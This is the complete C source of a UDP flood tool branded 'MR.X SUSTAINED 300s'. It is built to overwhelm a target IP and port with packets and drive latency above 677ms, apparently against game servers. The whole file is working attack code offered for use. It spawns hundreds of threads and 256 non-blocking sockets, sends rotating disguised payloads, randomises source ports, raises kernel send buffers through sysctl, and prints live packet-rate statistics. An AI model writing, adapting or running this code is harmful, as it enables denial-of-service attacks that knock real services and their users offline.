#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>

#define BUFFER_COUNT 1024
#define FLOOD_SOCKETS 256
#define MIN_PACKET_SIZE 28
#define MAX_PACKET_SIZE 64
#define MIN_THREADS 150
#define MAX_THREADS 500
#define MIN_ATTACK_TIME 5
#define MAX_ATTACK_TIME 300

// Global variables
char *TARGET_IP = NULL;
int TARGET_PORT = 0;
int ATTACK_TIME = 0;
int PACKET_SIZE = 0;
int THREAD_COUNT = 0;

// Atomic counters - PROPERLY INITIALIZED
_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
_Atomic int stop_signal = 0;
_Atomic int global_start_time = 0;

// Arrays
char *buffers[BUFFER_COUNT] = {NULL};
struct sockaddr_in target_addr;

// Attack phases structure
typedef struct {
    int base_power;
    int duration;
    int pattern_type;
} AttackPhase;

// Optimized phases for 300s sustained attack
AttackPhase sustained_phases[] = {
    {100, 30, 0}, {85, 25, 1}, {95, 20, 2},
    {80, 30, 0}, {90, 25, 1}, {100, 20, 2},
    {75, 30, 0}, {85, 25, 1}, {95, 20, 2},
    {100, 45, 0}
};
int total_phases = 10;

// Function declarations
void optimize_kernel();
void set_sock_buf(int sock);
void fill_pattern_0(char *buf, int sz, unsigned int seed);
void fill_pattern_1(char *buf, int sz, unsigned int seed);
void fill_pattern_2(char *buf, int sz, unsigned int seed);
void fill_data(char *buf, int sz, unsigned int seed, int pattern);
void spoof_source_port(int sock, int phase);
void *sustained_attack_thread(void *arg);
void *direct_sustained_attack(void *arg);
void *ping_monitor(void *arg);
int init_buffers();
void cleanup_buffers();

// Kernel optimization
void optimize_kernel() {
#ifdef __linux__
    system("sysctl -w net.core.wmem_max=1073741824 >/dev/null 2>&1");
    system("sysctl -w net.core.wmem_default=67108864 >/dev/null 2>&1");
    system("sysctl -w net.core.netdev_max_backlog=5000000 >/dev/null 2>&1");
    system("sysctl -w net.ipv4.udp_mem='67108864 67108864 67108864' >/dev/null 2>&1");
#endif
}

// Socket buffer setup
void set_sock_buf(int sock) {
    int buf_size = 67108864;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
}

// Pattern 0: Basic random
void fill_pattern_0(char *buf, int sz, unsigned int seed) {
    for (int i = 0; i < sz; i++) {
        seed = seed * 1103515245 + 12345;
        buf[i] = (char)((seed >> 16) & 0xFF);
    }
}

// Pattern 1: SSDP-like
void fill_pattern_1(char *buf, int sz, unsigned int seed) {
    char template[] = "\x00\x01\x02\x03HTTP/1.1";
    int tlen = strlen(template);
    for (int i = 0; i < sz; i++) {
        buf[i] = template[i % tlen] ^ (char)(seed & 0xFF);
        seed = seed * 1664525 + 1013904223;
    }
}

// Pattern 2: Gaming-like
void fill_pattern_2(char *buf, int sz, unsigned int seed) {
    memset(buf, 0, sz/3);
    for (int i = sz/3; i < sz; i++) {
        seed = seed * 214013 + 2531011;
        buf[i] = (char)(seed & 0xFF);
    }
}

// Fill data with selected pattern
void fill_data(char *buf, int sz, unsigned int seed, int pattern) {
    switch(pattern % 3) {
        case 0: fill_pattern_0(buf, sz, seed); break;
        case 1: fill_pattern_1(buf, sz, seed); break;
        case 2: fill_pattern_2(buf, sz, seed); break;
    }
}

// Smart source port spoofing
void spoof_source_port(int sock, int phase) {
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    
    int base_port;
    switch(phase % 4) {
        case 0: base_port = 1024; break;
        case 1: base_port = 20000; break;
        case 2: base_port = 40000; break;
        default: base_port = 50000; break;
    }
    
    src_addr.sin_port = htons(base_port + (rand() % 10000));
    src_addr.sin_addr.s_addr = INADDR_ANY;
    bind(sock, (struct sockaddr*)&src_addr, sizeof(src_addr));
}

// Initialize buffers
int init_buffers() {
    if (PACKET_SIZE < MIN_PACKET_SIZE || PACKET_SIZE > MAX_PACKET_SIZE) {
        return 0;
    }
    
    unsigned int base_seed = time(NULL) ^ getpid();
    
    for (int i = 0; i < BUFFER_COUNT; i++) {
        buffers[i] = (char *)malloc(PACKET_SIZE);
        if (!buffers[i]) {
            // Cleanup already allocated buffers
            for (int j = 0; j < i; j++) {
                free(buffers[j]);
                buffers[j] = NULL;
            }
            return 0;
        }
        
        int pattern_type = (i / (BUFFER_COUNT/3)) % 3;
        fill_data(buffers[i], PACKET_SIZE, base_seed ^ (i * 1234567), pattern_type);
    }
    
    return 1;
}

// Cleanup buffers
void cleanup_buffers() {
    for (int i = 0; i < BUFFER_COUNT; i++) {
        if (buffers[i]) {
            free(buffers[i]);
            buffers[i] = NULL;
        }
    }
}

// Sustained attack thread (main worker)
void *sustained_attack_thread(void *arg) {
    int tid = *((int *)arg);
    
    // Set CPU affinity
#ifdef __linux__
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    int cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (cores > 0) {
        CPU_SET(tid % cores, &cpu_set);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpu_set);
    }
#endif
    
    // Create socket
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        return NULL;
    }
    
    // Configure socket
    set_sock_buf(sock);
    
    int flags = fcntl(sock, F_GETFL, 0);
    if (flags >= 0) {
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    }
    
    int start_time = atomic_load(&global_start_time);
    int phase_index = 0;
    int phase_start = time(NULL);
    
    while (!atomic_load(&stop_signal) && (time(NULL) - start_time) < ATTACK_TIME) {
        // Check phase change
        int phase_elapsed = time(NULL) - phase_start;
        if (phase_elapsed >= sustained_phases[phase_index].duration) {
            phase_index = (phase_index + 1) % total_phases;
            phase_start = time(NULL);
            spoof_source_port(sock, phase_index);
        }
        
        AttackPhase *phase = &sustained_phases[phase_index];
        int packets_per_burst = (phase->base_power * 120) / 100;
        
        // Send packets
        for (int i = 0; i < packets_per_burst; i++) {
            int buffer_idx = (tid * 17 + phase_index * 23 + i) % BUFFER_COUNT;
            int ret = sendto(sock, buffers[buffer_idx], PACKET_SIZE, MSG_DONTWAIT,
                           (struct sockaddr *)&target_addr, sizeof(target_addr));
            
            if (ret > 0) {
                atomic_fetch_add(&total_packets, 1);
                atomic_fetch_add(&total_bytes, PACKET_SIZE);
            }
        }
        
        // Micro-delay for stability
        if (ATTACK_TIME >= 60) {
            usleep(100);
        }
    }
    
    close(sock);
    return NULL;
}

// Direct sustained attack
void *direct_sustained_attack(void *arg) {
    int socks[FLOOD_SOCKETS];
    int active_socks = 0;
    
    // Create sockets
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (socks[i] >= 0) {
            active_socks++;
            set_sock_buf(socks[i]);
            
            int flags = fcntl(socks[i], F_GETFL, 0);
            if (flags >= 0) {
                fcntl(socks[i], F_SETFL, flags | O_NONBLOCK);
            }
            
            spoof_source_port(socks[i], i % 4);
        } else {
            socks[i] = -1;
        }
    }
    
    printf("[+] Direct attack sockets: %d/%d\n", active_socks, FLOOD_SOCKETS);
    
    int phase_index = 0;
    int phase_start = time(NULL);
    
    while (!atomic_load(&stop_signal)) {
        // Phase management
        int phase_elapsed = time(NULL) - phase_start;
        if (phase_elapsed >= sustained_phases[phase_index].duration) {
            phase_index = (phase_index + 1) % total_phases;
            phase_start = time(NULL);
        }
        
        AttackPhase *phase = &sustained_phases[phase_index];
        
        // Attack loop
        for (int i = 0; i < FLOOD_SOCKETS; i++) {
            if (socks[i] < 0) continue;
            
            int bursts = (phase->base_power * 40) / 100;
            for (int b = 0; b < bursts; b++) {
                int buffer_idx = (i * 19 + phase_index * 29 + b) % BUFFER_COUNT;
                
                for (int p = 0; p < 3; p++) {
                    sendto(socks[i], buffers[(buffer_idx + p) % BUFFER_COUNT], 
                           PACKET_SIZE, MSG_DONTWAIT,
                           (struct sockaddr*)&target_addr, sizeof(target_addr));
                }
            }
        }
        
        // Small delay
        usleep(1000);
    }
    
    // Cleanup sockets
    for (int i = 0; i < FLOOD_SOCKETS; i++) {
        if (socks[i] >= 0) {
            close(socks[i]);
        }
    }
    
    return NULL;
}

// Ping monitor thread
void *ping_monitor(void *arg) {
    sleep(2);
    
    printf("\n🎯 SUSTAINED ATTACK STARTED\n");
    printf("🎯 Target: %s:%d | Time: %ds\n", TARGET_IP, TARGET_PORT, ATTACK_TIME);
    printf("⚡ Goal: 677ms+ PING CONTINUOUS\n\n");
    
    unsigned long long prev_packets = atomic_load(&total_packets);
    unsigned long long prev_bytes = atomic_load(&total_bytes);
    int elapsed = 0;
    
    while (elapsed < ATTACK_TIME && !atomic_load(&stop_signal)) {
        sleep(1);
        elapsed++;
        
        unsigned long long curr_packets = atomic_load(&total_packets);
        unsigned long long curr_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = curr_packets - prev_packets;
        unsigned long long bps = (curr_bytes - prev_bytes) * 8;
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        // Ping estimation
        double estimated_ping = 50.0 + (pps / 5000.0);
        if (estimated_ping > 677) estimated_ping = 677;
        
        double mbps = bps / (1024.0 * 1024.0);
        
        printf("[%03ds] PPS: %lluK | Ping: %.0fms | MBps: %.1f\n", 
               elapsed, pps/1000, estimated_ping, mbps);
        
        prev_packets = curr_packets;
        prev_bytes = curr_bytes;
    }
    
    // Final stats
    unsigned long long total_p = atomic_load(&total_packets);
    unsigned long long total_b = atomic_load(&total_bytes);
    
    printf("\n✅ ATTACK COMPLETED\n");
    printf("📊 Total packets: %.1fM\n", total_p / 1000000.0);
    printf("💾 Total data: %.2f MB\n", total_b / (1024.0 * 1024.0));
    printf("🚀 Peak PPS: %.0fK\n", atomic_load(&peak_pps) / 1000.0);
    
    return NULL;
}

int main(int argc, char *argv[]) {
    // Disable buffering for real-time output
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    
    // Initialize random seed
    srand(time(NULL) ^ getpid());
    
    // Banner
    printf("\n╔════════════════════════════════════════════════╗\n");
    printf("║           🎯 MR.X SUSTAINED 300s 🎯           ║\n");
    printf("║     677ms+ PING CONTINUOUS ATTACK             ║\n");
    printf("╚════════════════════════════════════════════════╝\n\n");
    
    // Check arguments
    if (argc != 6) {
        printf("Usage: %s IP PORT TIME SIZE THREADS\n\n", argv[0]);
        printf("Examples:\n");
        printf("  %s 1.2.3.4 7010 300 32 200   # 5 minutes attack\n", argv[0]);
        printf("  %s 1.2.3.4 7010 120 32 250   # 2 minutes attack\n", argv[0]);
        printf("  %s 1.2.3.4 7010 60 64 300    # 1 minute attack\n\n");
        
        printf("Ranges:\n");
        printf("  TIME: %d-%d seconds\n", MIN_ATTACK_TIME, MAX_ATTACK_TIME);
        printf("  SIZE: %d-%d bytes\n", MIN_PACKET_SIZE, MAX_PACKET_SIZE);
        printf("  THREADS: %d-%d\n", MIN_THREADS, MAX_THREADS);
        
        return 1;
    }
    
    // Parse arguments
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    ATTACK_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    // Validate and auto-optimize
    if (ATTACK_TIME < MIN_ATTACK_TIME) ATTACK_TIME = MIN_ATTACK_TIME;
    if (ATTACK_TIME > MAX_ATTACK_TIME) ATTACK_TIME = MAX_ATTACK_TIME;
    
    if (PACKET_SIZE < MIN_PACKET_SIZE) PACKET_SIZE = MIN_PACKET_SIZE;
    if (PACKET_SIZE > MAX_PACKET_SIZE) PACKET_SIZE = MAX_PACKET_SIZE;
    
    if (THREAD_COUNT < MIN_THREADS) THREAD_COUNT = MIN_THREADS;
    if (THREAD_COUNT > MAX_THREADS) THREAD_COUNT = MAX_THREADS;
    
    // Auto-optimize for sustained attacks
    if (ATTACK_TIME >= 120) {
        printf("[MODE] SUSTAINED ATTACK OPTIMIZATION\n");
        if (PACKET_SIZE > 48) PACKET_SIZE = 48;
        if (THREAD_COUNT > 400) THREAD_COUNT = 400;
    }
    
    // Setup target address
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    
    if (inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr) <= 0) {
        printf("[ERROR] Invalid IP address: %s\n", TARGET_IP);
        return 1;
    }
    
    // Display attack parameters
    printf("[+] Attack Parameters:\n");
    printf("    Target: %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("    Duration: %d seconds\n", ATTACK_TIME);
    printf("    Packet size: %d bytes\n", PACKET_SIZE);
    printf("    Threads: %d\n", THREAD_COUNT);
    
    // Optimize kernel settings
    printf("[+] Optimizing kernel settings...\n");
    optimize_kernel();
    
    // Initialize buffers
    printf("[+] Initializing buffers...\n");
    if (!init_buffers()) {
        printf("[ERROR] Failed to initialize buffers\n");
        return 1;
    }
    
    printf("[+] Buffers ready: %d x %d bytes\n", BUFFER_COUNT, PACKET_SIZE);
    
    // Set global start time
    atomic_store(&global_start_time, time(NULL));
    
    // Start direct attack thread
    pthread_t direct_thread;
    if (pthread_create(&direct_thread, NULL, direct_sustained_attack, NULL) != 0) {
        printf("[ERROR] Failed to create direct attack thread\n");
        cleanup_buffers();
        return 1;
    }
    
    // Allocate thread arrays
    pthread_t *threads = (pthread_t *)malloc(THREAD_COUNT * sizeof(pthread_t));
    int *thread_ids = (int *)malloc(THREAD_COUNT * sizeof(int));
    
    if (!threads || !thread_ids) {
        printf("[ERROR] Memory allocation failed\n");
        cleanup_buffers();
        if (threads) free(threads);
        if (thread_ids) free(thread_ids);
        return 1;
    }
    
    // Create attack threads
    printf("[+] Creating %d attack threads...\n", THREAD_COUNT);
    
    int threads_created = 0;
    for (int i = 0; i < THREAD_COUNT; i++) {
        thread_ids[i] = i;
        if (pthread_create(&threads[i], NULL, sustained_attack_thread, &thread_ids[i]) == 0) {
            threads_created++;
        } else {
            printf("[WARNING] Failed to create thread %d\n", i);
            threads[i] = 0;
        }
    }
    
    printf("[+] Created %d/%d threads successfully\n", threads_created, THREAD_COUNT);
    
    // Start ping monitor
    pthread_t monitor_thread;
    pthread_create(&monitor_thread, NULL, ping_monitor, NULL);
    
    printf("\n[+] Attack started! Running for %d seconds...\n\n", ATTACK_TIME);
    
    // Wait for attack duration
    sleep(ATTACK_TIME);
    
    // Signal threads to stop
    printf("[+] Stopping attack...\n");
    atomic_store(&stop_signal, 1);
    
    // Give threads time to finish
    sleep(3);
    
    // Wait for all threads
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (threads[i] != 0) {
            pthread_join(threads[i], NULL);
        }
    }
    
    pthread_join(direct_thread, NULL);
    pthread_join(monitor_thread, NULL);
    
    // Cleanup
    cleanup_buffers();
    free(threads);
    free(thread_ids);
    
    printf("[+] Cleanup completed\n");
    printf("[+] Attack finished successfully\n");
    
    return 0;
}